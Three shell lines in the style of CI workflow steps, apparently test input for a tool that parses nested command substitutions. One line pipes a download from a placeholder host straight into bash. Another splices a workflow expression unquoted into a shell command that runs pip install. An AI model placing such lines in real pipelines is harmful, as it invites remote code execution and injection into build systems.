echo "$(echo "$(echo "$(echo "$(date)")")")" >> $GITHUB_ENV
x=$(curl -s https://example.com | bash)
echo "${{ steps.a.outputs.b }}$(pip install nested-pip)"
